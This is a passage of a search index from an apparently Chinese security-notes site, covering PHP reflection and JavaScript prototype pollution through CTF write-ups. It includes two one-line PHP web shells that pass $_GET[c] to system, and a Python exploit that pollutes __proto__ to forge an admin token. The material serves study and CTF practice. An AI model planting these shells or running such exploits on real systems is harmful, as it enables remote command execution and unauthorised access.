\u3000\u3000\u3000\u3000$Properties\uff3b$v->getName()\uff3d = $v; } foreach($obj->getMethods() as $v) \u3000\u3000 { \u3000\u3000\u3000\u3000$Methods\uff3b$v->getName()\uff3d = $v; } echo \"class {$className}\\n{\\n\"; is_array($Properties)&&ksort($Properties); foreach($Properties as $k => $v) { \u3000\u3000\u3000\u3000echo \"\\t\"; \u3000\u3000\u3000\u3000echo $v->isPublic() ? ' public' : '',$v->isPrivate() ? ' private' : '', \u3000\u3000\u3000\u3000$v->isProtected() ? ' protected' : '', \u3000\u3000\u3000\u3000$v->isStatic() ? ' static' : ''; \u3000\u3000\u3000\u3000echo \"\\t{$k}\\n\"; } echo \"\\n\"; if(is_array($Methods)) ksort($Methods); foreach($Methods as $k => $v) { \u3000\u3000\u3000\u3000echo \"\\tfunction {$k}(){}\\n\"; } echo \"}\\n\"; \u8f93\u51fa\u5982\u4e0b\uff1a 1 2 3 4 5 6 7 8 class person { public\u3000gender public\u3000name function get(){} function set(){} function say(){} } \u52a8\u6001\u4ee3\u7406\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 <?php class mysql { function connect ( $db ) { echo \"\u8fde\u63a5\u5230\u6570\u636e\u5e93 ${ db\uff3b0\uff3d } \\r\\n \" ; } } class sqlproxy { private $target ; function construct ( $tar ) { $this -> target\uff3b\uff3d = new $tar (); } function call ( $name , $args ) { foreach ( $this -> target as $obj ) { $r = new ReflectionClass ( $obj ); if ( $method = $r -> getMethod ( $name )) { if ( $method -> isPublic () && ! $method -> isAbstract ()) { echo \"\u65b9\u6cd5\u524d\u62e6\u622a\u8bb0\u5f55LOG \\r\\n \" ; $method -> invoke ( $obj , $args ); echo \"\u65b9\u6cd5\u540e\u62e6\u622a \\r\\n \" ; } } } } } $obj = new sqlproxy ( 'mysql' ); $obj -> connect ( 'member' ); ReflectionFunction\u7c7b \u00b6 1 2 3 4 5 6 7 8 9 10 <?php function title ( $title , $name ) { return sprintf ( \"%s. %s \\r\\n \" , $title , $name ); } $function = new ReflectionFunction ( 'title' ); echo $function -> invokeArgs ( array ( 'Dr' , 'Phil' )); //\u76f8\u5f53\u4e8e\u8c03\u7528\u4e86title\u51fd\u6570 ?> \u4e00\u4e2a\u7b80\u5355\u7684shell\uff1a 1 2 3 4 <?php $func = new ReflectionFunction ( \"system\" ); echo $func -> invokeArgs ( array ( \" $_GET[c] \" )); ?> ob_start\u51fd\u6570 \u00b6 1 2 3 4 5 6 <?php $cb = 'system' ; ob_start ( $cb ); echo $_GET [ c ]; ob_end_flush (); ?> \u53c2\u8003 \u00b6 https://security.tencent.com/index.php/blog/msg/58","title":"php\u53cd\u5c04"},{"location":"audit/php\u53cd\u5c04/#php","text":"\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\u4e2d\u5bf9\u8c61\u88ab\u8d4b\u4e88\u4e86\u81ea\u7701\u7684\u80fd\u529b\uff0c\u800c\u8fd9\u4e2a\u81ea\u7701\u7684\u8fc7\u7a0b\u5c31\u662f\u53cd\u5c04\u3002 \u53cd\u5c04\uff0c\u76f4\u89c2\u7406\u89e3\u5c31\u662f\u6839\u636e\u5230\u8fbe\u5730\u627e\u5230\u51fa\u53d1\u5730\u548c\u6765\u6e90\u3002\u6bd4\u5982\uff0c\u4e00\u4e2a\u5149\u79c3\u79c3\u7684\u5bf9\u8c61\uff0c\u6211\u4eec\u53ef\u4ee5\u4ec5\u4ec5\u901a\u8fc7\u8fd9\u4e2a\u5bf9\u8c61\u5c31\u80fd\u77e5\u9053\u5b83\u6240\u5c5e\u7684\u7c7b\u3001\u62e5\u6709\u54ea\u4e9b\u65b9\u6cd5\u3002 \u53cd\u5c04\u662f\u6307\u5728PHP\u8fd0\u884c\u72b6\u6001\u4e2d\uff0c\u6269\u5c55\u5206\u6790PHP\u7a0b\u5e8f\uff0c\u5bfc\u51fa\u6216\u63d0\u51fa\u5173\u4e8e\u7c7b\u3001\u65b9\u6cd5\u3001\u5c5e\u6027\u3001\u53c2\u6570\u7b49\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u5305\u62ec\u6ce8\u91ca\u3002\u8fd9\u79cd\u52a8\u6001\u83b7\u53d6\u4fe1\u606f\u4ee5\u53ca\u52a8\u6001\u8c03\u7528\u5bf9\u8c61\u65b9\u6cd5\u7684\u529f\u80fd\u79f0\u4e3a\u53cd\u5c04API\u3002 \u5982\u4f55\u4f7f\u7528\u53cd\u5c04API 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 <?php class person { public $name ; public $gender ; public function say (){ echo $this -> name , \" \\t is \" , $this -> gender , \" \\r\\n \" ; } public function set ( $name , $value ) { echo \"Setting $name to $value \\r\\n \" ; $this -> $name = $value ; } public function get ( $name ) { if ( ! isset ( $this -> $name )){ echo '\u672a\u8bbe\u7f6e' ; \u3000\u3000 $this -> $name = \"\u6b63\u5728\u4e3a\u4f60\u8bbe\u7f6e\u9ed8\u8ba4\u503c\" ; } return $this -> $name ; } } $student = new person (); $student -> name = 'Tom' ; $student -> gender = 'male' ; $student -> age = 24 ; \u73b0\u5728\uff0c\u8981\u83b7\u53d6\u8fd9\u4e2astudent\u5bf9\u8c61\u7684\u65b9\u6cd5\u548c\u5c5e\u6027\u5217\u8868\u8be5\u600e\u4e48\u505a\u5462\uff1f\u5982\u4ee5\u4e0b\u4ee3\u7801\u6240\u793a\uff1a 1 2 3 4 5 6 7 8 9 10 11 // \u83b7\u53d6\u5bf9\u8c61\u5c5e\u6027\u5217\u8868 $reflect = new ReflectionObject($student); $props\u3000= $reflect->getProperties(); foreach ($props as $prop) { print $prop->getName() .\"\\n\"; } // \u83b7\u53d6\u5bf9\u8c61\u65b9\u6cd5\u5217\u8868 $m=$reflect->getMethods(); foreach ($m as $prop) { print $prop->getName() .\"\\n\"; } \u4e5f\u53ef\u4ee5\u4e0d\u7528\u53cd\u5c04API\uff0c\u4f7f\u7528class\u51fd\u6570\uff0c\u8fd4\u56de\u5bf9\u8c61\u5c5e\u6027\u7684\u5173\u8054\u6570\u7ec4\u4ee5\u53ca\u66f4\u591a\u7684\u4fe1\u606f\uff1a 1 2 3 4 5 6 // \u8fd4\u56de\u5bf9\u8c61\u5c5e\u6027\u7684\u5173\u8054\u6570\u7ec4 var_dump(get_object_vars($student)); // \u7c7b\u5c5e\u6027 var_dump(get_class_vars(get_class($student))); // \u8fd4\u56de\u7531\u7c7b\u7684\u65b9\u6cd5\u540d\u7ec4\u6210\u7684\u6570\u7ec4 var_dump(get_class_methods(get_class($student))); \u5047\u5982\u8fd9\u4e2a\u5bf9\u8c61\u662f\u4ece\u5176\u4ed6\u9875\u9762\u4f20\u8fc7\u6765\u7684\uff0c\u600e\u4e48\u77e5\u9053\u5b83\u5c5e\u4e8e\u54ea\u4e2a\u7c7b\u5462\uff1f\u4e00\u53e5\u4ee3\u7801\u5c31\u53ef\u4ee5\u641e\u5b9a\uff1a 1 2 // \u83b7\u53d6\u5bf9\u8c61\u5c5e\u6027\u5217\u8868\u6240\u5c5e\u7684\u7c7b echo get_class($student); \u53cd\u5c04API\u7684\u529f\u80fd\u663e\u7136\u66f4\u5f3a\u5927\uff0c\u751a\u81f3\u80fd\u8fd8\u539f\u8fd9\u4e2a\u7c7b\u7684\u539f\u578b\uff0c\u5305\u62ec\u65b9\u6cd5\u7684\u8bbf\u95ee\u6743\u9650\u7b49\uff0c\u5982\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 // \u53cd\u5c04\u83b7\u53d6\u7c7b\u7684\u539f\u578b $obj = new ReflectionClass('person'); $className = $obj->getName(); $Methods = $Properties = array(); foreach($obj->getProperties() as $v) { \u3000\u3000\u3000\u3000$Properties\uff3b$v->getName()\uff3d = $v; } foreach($obj->getMethods() as $v) \u3000\u3000 { \u3000\u3000\u3000\u3000$Methods\uff3b$v->getName()\uff3d = $v; } echo \"class {$className}\\n{\\n\"; is_array($Properties)&&ksort($Properties); foreach($Properties as $k => $v) { \u3000\u3000\u3000\u3000echo \"\\t\"; \u3000\u3000\u3000\u3000echo $v->isPublic() ? ' public' : '',$v->isPrivate() ? ' private' : '', \u3000\u3000\u3000\u3000$v->isProtected() ? ' protected' : '', \u3000\u3000\u3000\u3000$v->isStatic() ? ' static' : ''; \u3000\u3000\u3000\u3000echo \"\\t{$k}\\n\"; } echo \"\\n\"; if(is_array($Methods)) ksort($Methods); foreach($Methods as $k => $v) { \u3000\u3000\u3000\u3000echo \"\\tfunction {$k}(){}\\n\"; } echo \"}\\n\"; \u8f93\u51fa\u5982\u4e0b\uff1a 1 2 3 4 5 6 7 8 class person { public\u3000gender public\u3000name function get(){} function set(){} function say(){} } \u52a8\u6001\u4ee3\u7406\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 <?php class mysql { function connect ( $db ) { echo \"\u8fde\u63a5\u5230\u6570\u636e\u5e93 ${ db\uff3b0\uff3d } \\r\\n \" ; } } class sqlproxy { private $target ; function construct ( $tar ) { $this -> target\uff3b\uff3d = new $tar (); } function call ( $name , $args ) { foreach ( $this -> target as $obj ) { $r = new ReflectionClass ( $obj ); if ( $method = $r -> getMethod ( $name )) { if ( $method -> isPublic () && ! $method -> isAbstract ()) { echo \"\u65b9\u6cd5\u524d\u62e6\u622a\u8bb0\u5f55LOG \\r\\n \" ; $method -> invoke ( $obj , $args ); echo \"\u65b9\u6cd5\u540e\u62e6\u622a \\r\\n \" ; } } } } } $obj = new sqlproxy ( 'mysql' ); $obj -> connect ( 'member' );","title":"php\u53cd\u5c04"},{"location":"audit/php\u53cd\u5c04/#reflectionfunction","text":"1 2 3 4 5 6 7 8 9 10 <?php function title ( $title , $name ) { return sprintf ( \"%s. %s \\r\\n \" , $title , $name ); } $function = new ReflectionFunction ( 'title' ); echo $function -> invokeArgs ( array ( 'Dr' , 'Phil' )); //\u76f8\u5f53\u4e8e\u8c03\u7528\u4e86title\u51fd\u6570 ?> \u4e00\u4e2a\u7b80\u5355\u7684shell\uff1a 1 2 3 4 <?php $func = new ReflectionFunction ( \"system\" ); echo $func -> invokeArgs ( array ( \" $_GET[c] \" )); ?>","title":"ReflectionFunction\u7c7b"},{"location":"audit/php\u53cd\u5c04/#ob_start","text":"1 2 3 4 5 6 <?php $cb = 'system' ; ob_start ( $cb ); echo $_GET [ c ]; ob_end_flush (); ?>","title":"ob_start\u51fd\u6570"},{"location":"audit/php\u53cd\u5c04/#_1","text":"https://security.tencent.com/index.php/blog/msg/58","title":"\u53c2\u8003"},{"location":"audit/\u539f\u578b\u94fe\u6c61\u67d3/","text":"\u539f\u578b\u94fe\u6c61\u67d3\u653b\u51fb \u00b6 1 2 3 4 > let obj = {}; <\u00b7 undefined > obj.__proto__; <\u00b7 {constructor: \u0192, __defineGetter__: \u0192, __defineSetter__: \u0192, hasOwnProperty: \u0192, __lookupGetter__: \u0192, \u2026} \u800c\u7ecf\u8fc7\u4e0d\u65ad\u7684\u8c03\u7528,\u6700\u7ec8\u7684\u539f\u578b\u5bf9\u8c61\u4f1a\u8c03\u7528\u5230null,\u8fd9\u5c06\u4f5c\u4e3a\u8be5\u539f\u578b\u94fe\u7684\u6700\u540e\u4e00\u4e2a\u73af\u8282,\u4e0e\u4e4b\u5bf9\u5e94\u7684,\u4f5c\u4e3a\u7ec8\u70b9\u7684null\u81ea\u7136\u4e5f\u662f\u6ca1\u6709\u539f\u578b\u5bf9\u8c61\u7684\u3002\u6bd4\u5982,\u6211\u4eec\u7ee7\u7eed\u5728\u4e0a\u9762\u7684\u4f8b\u5b50\u4e2d\u8c03\u7528\u5176\u539f\u578b\u5bf9\u8c61: obj. proto . proto ; <\u00b7 null \u5728Javascript\u4e2d\u53ef\u4ee5\u901a\u8fc7example.a.b\u6216example.a[\"b\"]\u6765\u5bf9\u6570\u7ec4\u8fdb\u884c\u8bbf\u95ee,example.a\u8bbf\u95ee\u7684\u662fexample\u5bf9\u8c61\u4e0b\u7684a\u5bf9\u8c61\u7684b,\u800cexample.a[\"b\"]\u5219\u662f\u8bbf\u95eeexample\u5bf9\u8c61\u4e0b\u7684a\u6570\u7ec4\u7684\u4e0b\u6807\u4e3ab\u7684\u503c\u3002 \u7531\u4e8e\u5bf9\u8c61\u662f\u65e0\u5e8f\u7684,\u5f53\u4f7f\u7528\u7b2c\u4e8c\u79cd\u65b9\u5f0f\u8bbf\u95ee\u5bf9\u8c61\u65f6,\u53ea\u80fd\u4f7f\u7528\u6307\u660e\u4e0b\u6807\u7684\u65b9\u5f0f\u53bb\u8bbf\u95ee\u3002 \u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7a[\" proto \"]\u7684\u65b9\u5f0f\u53bb\u8bbf\u95ee\u5176\u539f\u578b\u5bf9\u8c61\u3002 \u5b9e\u4f8b \u00b6 Hackit 2018 \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 const express = require ( 'express' ) var hbs = require ( 'hbs' ); var bodyParser = require ( 'body-parser' ); const md5 = require ( 'md5' ); var morganBody = require ( 'morgan-body' ); const app = express (); var user = []; //empty for now var matrix = []; for ( var i = 0 ; i < 3 ; i ++ ){ matrix [ i ] = [ null , null , null ]; } function draw ( mat ) { var count = 0 ; for ( var i = 0 ; i < 3 ; i ++ ){ for ( var j = 0 ; j < 3 ; j ++ ){ if ( matrix [ i ][ j ] !== null ){ count += 1 ; } } } return count === 9 ; } app . use ( '/static' , express . static ( 'static' )); app . use ( bodyParser . json ()); app . set ( 'view engine' , 'html' ); morganBody ( app ); app . engine ( 'html' , require ( 'hbs' ). __express ); app . get ( '/' , ( req , res ) => { for ( var i = 0 ; i < 3 ; i ++ ){ matrix [ i ] = [ null , null , null ]; } res . render ( 'index' ); }) app . get ( '/admin' , ( req , res ) => { /*this is under development I guess ??*/ if ( user . admintoken && req . query . querytoken && md5 ( user . admintoken ) === req . query . querytoken ){ res . send ( 'Hey admin your flag is <b>flag{prototype_pollution_is_very_dangerous}</b>' ); } else { res . status ( 403 ). send ( 'Forbidden' ); } } ) app . post ( '/api' , ( req , res ) => { var client = req . body ; var winner = null ; if ( client . row > 3 || client . col > 3 ){ client . row %= 3 ; client . col %= 3 ; } matrix [ client . row ][ client . col ] = client . data ; console . log ( matrix ); for ( var i = 0 ; i < 3 ; i ++ ){ if ( matrix [ i ][ 0 ] === matrix [ i ][ 1 ] && matrix [ i ][ 1 ] === matrix [ i ][ 2 ] ){ if ( matrix [ i ][ 0 ] === 'X' ) { winner = 1 ; } else if ( matrix [ i ][ 0 ] === 'O' ) { winner = 2 ; } } if ( matrix [ 0 ][ i ] === matrix [ 1 ][ i ] && matrix [ 1 ][ i ] === matrix [ 2 ][ i ]){ if ( matrix [ 0 ][ i ] === 'X' ) { winner = 1 ; } else if ( matrix [ 0 ][ i ] === 'O' ) { winner = 2 ; } } } if ( matrix [ 0 ][ 0 ] === matrix [ 1 ][ 1 ] && matrix [ 1 ][ 1 ] === matrix [ 2 ][ 2 ] && matrix [ 0 ][ 0 ] === 'X' ){ winner = 1 ; } if ( matrix [ 0 ][ 0 ] === matrix [ 1 ][ 1 ] && matrix [ 1 ][ 1 ] === matrix [ 2 ][ 2 ] && matrix [ 0 ][ 0 ] === 'O' ){ winner = 2 ; } if ( matrix [ 0 ][ 2 ] === matrix [ 1 ][ 1 ] && matrix [ 1 ][ 1 ] === matrix [ 2 ][ 0 ] && matrix [ 2 ][ 0 ] === 'X' ){ winner = 1 ; } if ( matrix [ 0 ][ 2 ] === matrix [ 1 ][ 1 ] && matrix [ 1 ][ 1 ] === matrix [ 2 ][ 0 ] && matrix [ 2 ][ 0 ] === 'O' ){ winner = 2 ; } if ( draw ( matrix ) && winner === null ){ res . send ( JSON . stringify ({ winner : 0 })) } else if ( winner !== null ) { res . send ( JSON . stringify ({ winner : winner })) } else { res . send ( JSON . stringify ({ winner : - 1 })) } }) app . listen ( 3000 , () => { console . log ( 'app listening on port 3000!' ) }) \u6f0f\u6d1e\u5173\u952e\u4f4d\u7f6e 1 2 3 4 5 6 7 8 9 10 app . post ( '/api' , ( req , res ) => { var client = req . body ; var winner = null ; if ( client . row > 3 || client . col > 3 ){ client . row %= 3 ; client . col %= 3 ; } matrix [ client . row ][ client . col ] = client . data ; \u800cdata\u662f\u4ece\u7f51\u9875\u4f20\u9012\u7684\u53c2\u6570,\u5f62\u5982: {\"row\":1,\"col\":\"1\",\"data\":\"X\"} \u5bf9\u5e94\u7684row\u4ee5\u53cacol\u503c\u4f1a\u5b58\u653e\u81f3matrix\u4e2d,\u800c\u8fd9\u91cc\u5219\u4f1a\u5bfc\u81f4\u4e00\u4e2a\u539f\u578b\u94fe\u6c61\u67d3\u7684\u9690\u60a3\u3002 \u56de\u5230\u9898\u76ee\u672c\u8eab\u7684\u903b\u8f91\u4e2d,\u83b7\u5f97Flag\u7684\u8981\u6c42\u4e3a: \u4f20\u5165\u7684querytoken\u4e0euser.admintoken\u7684md5\u54c8\u5e0c\u503c\u4e00\u6837 \u4e00\u4e2a\u7b80\u8981\u7684\u539f\u578b\u94fe\u6c61\u67d3\u5982\u4e0b\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 > a=[]; <\u00b7 [] > b=[]; <\u00b7 [] > b[\"__proto__\"]; <\u00b7 [constructor: \u0192, concat: \u0192, find: \u0192, findIndex: \u0192, pop: \u0192, \u2026] > b[\"__proto__\"][\"admintoken\"]=\"ccda\"; <\u00b7 \"ccda\" > a <\u00b7 [] > a.admintoken <\u00b7 \"ccda\" \u53c2\u8003wp\u5f97\u5230\u4e00\u4e2aexp\u5982\u4e0b\uff1a 1 2 3 4 5 6 import requests r = requests . post ( 'http://185.168.131.1:3000/api' , json = { 'row' : '__proto__' , 'col' : 'admintoken' , 'data' : 'qqq' }) r = requests . get ( 'http://185.168.131.1:3000/admin?querytoken=' + md5sumhex ( 'qqq' )) print r . text \u90a3\u4e48 matrix[__proto__][admintoken]=qqq \u8fd9\u5c31\u8db3\u4ee5\u8fbe\u5230\u76ee\u7684\u4e86 GitHub\u4e0a\u4e00\u4e2a\u7528\u6765\u68c0\u6d4b\u662f\u5426\u5b58\u5728\u539f\u578b\u94fe\u6c61\u67d3\u7684\u9879\u76ee https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/README.md \u6765\u81eap\u725b\u7684\u6587\u7ae0 \u00b6 JavaScript\u4e2d\uff0c\u6211\u4eec\u5982\u679c\u8981\u5b9a\u4e49\u4e00\u4e2a\u7c7b\uff0c\u9700\u8981\u4ee5\u5b9a\u4e49\u201c\u6784\u9020\u51fd\u6570\u201d\u7684\u65b9\u5f0f\u6765\u5b9a\u4e49\uff1a 1 2 3 4 5 function Foo () { this . bar = 1 } new Foo () Foo\u51fd\u6570\u7684\u5185\u5bb9\uff0c\u5c31\u662fFoo\u7c7b\u7684\u6784\u9020\u51fd\u6570\uff0c\u800cthis.bar\u5c31\u662fFoo\u7c7b\u7684\u4e00\u4e2a\u5c5e\u6027\u3002 \u5c1d\u8bd5\u5982\u4e0b\u4ee3\u7801\uff0c foo \u662f object \u7c7b\u7684\u4e00\u4e2a\u5b9e\u4f8b\uff0c\u901a\u8fc7 foo.__proto__ \u4fee\u6539\u4e86 object \u7c7b\u7684\u5c5e\u6027 \u54ea\u4e9b\u60c5\u51b5\u4f1a\u88ab\u6c61\u67d3 \u00b6 \u6211\u4eec\u601d\u8003\u4e00\u4e0b\uff0c\u54ea\u4e9b\u60c5\u51b5\u4e0b\u6211\u4eec\u53ef\u4ee5\u8bbe\u7f6e __proto__ \u7684\u503c\u5462\uff1f\u5176\u5b9e\u627e\u627e\u80fd\u591f\u63a7\u5236\u6570\u7ec4\uff08\u5bf9\u8c61\uff09\u7684\u201c\u952e\u540d\u201d\u7684\u64cd\u4f5c\u5373\u53ef\uff1a \u5bf9\u8c61merge \u5bf9\u8c61clone\uff08\u5176\u5b9e\u5185\u6838\u5c31\u662f\u5c06\u5f85\u64cd\u4f5c\u7684\u5bf9\u8c61merge\u5230\u4e00\u4e2a\u7a7a\u5bf9\u8c61\u4e2d\uff09 \u5b89\u5168\u5ba2\u7684\u6458\u5f55 \u00b6 b \u5728\u5b9e\u4f8b\u5316\u4e3a test\u5bf9\u8c61 \u4ee5\u540e\uff0c\u5c31\u53ef\u4ee5\u8f93\u51fatest\u7c7b\u4e2d\u7684 \u5c5e\u6027a \u4e86 \u5728javascript\u4e2d,\u6bcf\u4e2a\u5bf9\u8c61\u7684\u90fd\u6709\u4e00\u4e2a\u6307\u5411\u4ed6\u7684\u539f\u578b(prototype)\u7684\u5185\u90e8\u94fe\u63a5\uff0c\u8fd9\u4e2a\u539f\u578b\u5bf9\u8c61\u53c8\u6709\u5b83\u81ea\u5df1\u7684\u539f\u578b\uff0c\u76f4\u5230null\u4e3a\u6b62 1 2 3 4 function i (){ this . a = \"test1\" ; this . b = \"test2\" ; } i \u7684\u7236\u7c7b\u4e3aobject\uff0c\u4e14\u91cc\u9762\u8fd8\u6709\u8bb8\u591a\u51fd\u6570\uff0c\u8fd9\u5c31\u89e3\u91ca\u4e86\u4e3a\u4ec0\u4e48\u8bb8\u591a\u53d8\u91cf\u53ef\u4ee5\u8c03\u7528\u67d0\u4e9b\u65b9\u6cd5\u3002 \u5728javascript\u4e2d\u4e00\u5207\u7686\u5bf9\u8c61\uff0c\u56e0\u4e3a\u6240\u6709\u7684\u53d8\u91cf\uff0c\u51fd\u6570\uff0c\u6570\u7ec4\uff0c\u5bf9\u8c61 \u90fd\u59cb\u4e8eobject\u7684\u539f\u578b\u5373object.prototype\u3002\u540c\u65f6\uff0c\u5728js\u4e2d\u53ea\u6709\u7c7b\u624d\u6709prototype\u5c5e\u6027\uff0c\u800c\u5bf9\u8c61\u5374\u6ca1\u6709\uff0c\u5bf9\u8c61\u6709\u7684\u662f __proto__ \u548c\u7c7b\u7684 prototype \u5bf9\u5e94\u3002\u4e14\u4e8c\u8005\u662f\u7b49\u4ef7\u7684 \u521b\u5efa\u4e00\u4e2a\u7c7b\u65f6 \u00b6 \u539f\u578b\u94fe\u4e3a b -> a.prototype -> object.prototype->null \u521b\u5efa\u4e00\u4e2a\u6570\u7ec4\u65f6 \u00b6 c -> array.prototype -> object.prototype->null \u521b\u5efa\u4e00\u4e2a\u51fd\u6570\u65f6 \u00b6 \u539f\u578b\u94fe\u4e3a\uff1a d -> function.prototype -> object.prototype->null \u521b\u5efa\u4e00\u4e2a\u65e5\u671f \u00b6 f -> Data.prototype -> object.prototype->null \u5f97\u51fa\uff1a javascript \u4e00\u5207\u7686\u5bf9\u8c61\uff0c\u4e00\u5207\u7686\u59cb\u4e8e object.prototype \u641c\u7d22\u7684\u8fc7\u7a0b \u00b6 \u5f53\u8981\u4f7f\u7528\u6216\u8f93\u51fa\u4e00\u4e2a\u53d8\u91cf\u65f6\uff1a\u9996\u5148\u4f1a\u5728\u672c\u5c42\u4e2d\u641c\u7d22\u76f8\u5e94\u7684\u53d8\u91cf\uff0c\u5982\u679c\u4e0d\u5b58\u5728\u7684\u8bdd\uff0c\u5c31\u4f1a\u5411\u4e0a\u641c\u7d22\uff0c\u5373\u5728\u81ea\u5df1\u7684\u7236\u7c7b\u4e2d\u641c\u7d22\uff0c\u5f53\u7236\u7c7b\u4e2d\u4e5f\u6ca1\u6709\u65f6\uff0c\u5c31\u4f1a\u5411\u7956\u7236\u7c7b\u641c\u7d22\uff0c\u76f4\u5230\u6307\u5411null\uff0c\u5982\u679c\u6b64\u65f6\u8fd8\u6ca1\u6709\u641c\u7d22\u5230\uff0c\u5c31\u4f1a\u8fd4\u56de undefined j -> i.prototype -> object.prototype -> null \u4e3e\u4f8b \u00b6 mess.js \u6587\u4ef6 1 2 3 4 5 ( function () { var secret = [ \"aaa\" , \"bbb\" ]; secret . forEach (); })(); attach.html \u7ed3\u679c\u5982\u4e0b\uff1a mess.js\u4e2d\u6211\u4eec\u58f0\u660e\u4e86\u4e00\u4e2a\u6570\u7ec4 secret ,\u7136\u540e\u8be5\u6570\u7ec4\u8c03\u7528\u4e86\u5c5e\u4e8e Array.protottype \u7684 foreach \u65b9\u6cd5,\u5982\u4e0b \u5728\u8c03\u7528js\u6587\u4ef6\u4e4b\u524d\uff0cjs\u4ee3\u7801\u4e2d\u5c06 Array.prototype.foreach \u65b9\u6cd5\u8fdb\u884c\u4e86\u91cd\u5199\uff0c\u800cprototype\u94fe\u4e3a secret -> Array.prototype ->object.prototype ,secret\u4e2d\u65e0 foreach \u65b9\u6cd5\uff0c\u6240\u4ee5\u5c31\u4f1a\u5411\u4e0a\u68c0\u7d22\uff0c\u5c31\u627e\u5230\u4e86 Array.prototype \u800c\u5176 foreach \u65b9\u6cd5\u5df2\u7ecf\u88ab\u91cd\u5199\u8fc7\u4e86\uff0c\u6240\u4ee5\u4f1a\u6267\u884c\u8f93\u51fa\u3002 \u8fd9\u5c31\u662f\u539f\u578b\u94fe\u6c61\u67d3\u3002\u5f88\u660e\u663e\uff0c\u539f\u578b\u94fe\u6c61\u67d3\u5c31\u662f\uff1a \u5728\u6211\u4eec\u60f3\u8981\u5229\u7528\u7684\u4ee3\u7801\u4e4b\u524d\u7684\u8d4b\u503c\u8bed\u53e5\u5982\u679c\u53ef\u63a7\u7684\u8bdd\uff0c\u6211\u4eec\u8fdb\u884c \u2014\u2014__proto__ \u8d4b\u503c\uff0c\u4e4b\u540e\u5c31\u53ef\u4ee5\u5229\u7528\u4ee3\u7801\u4e86 \u770b\u4e00\u9053\u9898\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 'use strict' ; const express = require ( 'express' ); const bodyParser = require ( 'body-parser' ) const cookieParser = require ( 'cookie-parser' ); const path = require ( 'path' ); const isObject = obj => obj && obj . constructor && obj . constructor === Object ; function merge ( a , b ) { for ( var attr in b ) { if ( isObject ( a [ attr ]) && isObject ( b [ attr ])) { merge ( a [ attr ], b [ attr ]); } else { a [ attr ] = b [ attr ]; } } return a } function clone ( a ) { return merge ({}, a ); } // Constants const PORT = 8080 ; const HOST = '0.0.0.0' ; const admin = {}; // App const app = express (); app . use ( bodyParser . json ()) app . use ( cookieParser ()); app . use ( '/' , express . static ( path . join ( __dirname , 'views' ))); app . post ( '/signup' , ( req , res ) => { var body = JSON . parse ( JSON . stringify ( req . body )); var copybody = clone ( body ) if ( copybody . name ) { res . cookie ( 'name' , copybody . name ). json ({ \"done\" : \"cookie set\" }); } else { res . json ({ \"error\" : \"cookie not set\" }) } }); app . get ( '/getFlag' , ( req , res ) => { var \u0430dmin = JSON . parse ( JSON . stringify ( req . cookies )) if ( admin . \u0430dmin == 1 ) { res . send ( \"hackim19{}\" ); } else { res . send ( \"You are not authorized\" ); } }); app . listen ( PORT , HOST ); console . log ( `Running on http:// ${ HOST } : ${ PORT } ` ); \u672c\u5730\u6d4b\u8bd5\uff1a \u672a\u6210\u529f \u4eec\u5728\u521b\u5efa\u5b57\u5178\u7684\u65f6\u5019\uff0c __proto__ ,\u4e0d\u662f\u4f5c\u4e3a\u4e00\u4e2a\u952e\u540d\uff0c\u800c\u662f\u5df2\u7ecf\u4f5c\u4e3a __proto__ \u7ed9\u5176\u7236\u7c7b\u8fdb\u884c\u8d4b\u503c\u4e86\uff0c\u6240\u4ee5\u5728 test.__proto__ \u4e2d\u624d\u6709admin\u5c5e\u6027\uff0c\u4f46\u662f\u6211\u4eec\u662f\u60f3\u8ba9 __proto__ \u4f5c\u4e3a\u4e00\u4e2a\u952e\u503c\u7684. \u4f7f\u7528JSON.parse JSON.parse \u4f1a\u628a\u4e00\u4e2ajson\u5b57\u7b26\u4e32 \u8f6c\u5316\u4e3a javascript\u7684object \u53c2\u8003 \u00b6 https://xz.aliyun.com/t/2735 https://github.com/DefConUA/HackIT2018/tree/master/web/Republic_of_Gayming https://www.anquanke.com/post/id/176884 \u6df1\u5165\u7406\u89e3JavaScript prototype\u6c61\u67d3\u653b\u51fb \u7ffb\u8bd1JavaScript\u539f\u578b\u94fe\u6c61\u67d3 decade\u5e08\u5085\u7684\u6587\u7ae0","title":"\u539f\u578b\u94fe\u6c61\u67d3\u653b\u51fb"},{"location":"audit/\u539f\u578b\u94fe\u6c61\u67d3/#_1","text":"1 2 3 4 > let obj = {}; <\u00b7 undefined > obj.__proto__; <\u00b7 {constructor: \u0192, __defineGetter__: \u0192, __defineSetter__: \u0192, hasOwnProperty: \u0192, __lookupGetter__: \u0192, \u2026} 